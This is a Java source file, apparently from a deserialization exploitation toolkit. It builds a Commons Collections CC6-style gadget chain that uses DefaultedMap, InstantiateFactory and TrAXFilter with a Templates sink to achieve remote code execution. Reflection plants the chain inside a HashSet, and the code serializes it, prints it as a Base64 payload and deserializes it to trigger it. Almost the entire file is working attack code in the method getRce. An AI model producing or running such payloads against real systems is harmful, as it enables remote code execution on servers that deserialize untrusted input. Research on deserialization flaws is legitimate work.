package xyz.eki.marshalexp.gadget.rome;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.DefaultedMap;
import org.apache.commons.collections.map.LazyMap;
import xyz.eki.marshalexp.sink.jdk.GTemplates;

import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.HashSet;

public class GCC6 {
    public static Object getRce(Object obj) throws Exception {
//        ToStringBean tb = new ToStringBean(clz, o);
//        EqualsBean eb = new EqualsBean(ToStringBean.class, tb);

        HashMap innermap = new HashMap();
        DefaultedMap map = (DefaultedMap) DefaultedMap.decorate(innermap,new FactoryTransformer(new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{obj})));

        TiedMapEntry tiedmap = new TiedMapEntry(map,123);

        HashSet hashset = new HashSet(1);
        hashset.add("foo");

        Field field = Class.forName("java.util.HashSet").getDeclaredField("map");
        field.setAccessible(true);
        HashMap hashset_map = (HashMap) field.get(hashset);

        Field table = Class.forName("java.util.HashMap").getDeclaredField("table");
        table.setAccessible(true);
        Object[] array = (Object[])table.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }

        Field key = node.getClass().getDeclaredField("key");
        key.setAccessible(true);
        key.set(node,tiedmap);

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc6"));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc6"));
            Path file = Paths.get("cc6");
            System.out.println(Base64.getEncoder().encodeToString(Files.readAllBytes(file)));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }

        return hashset;
    }
}
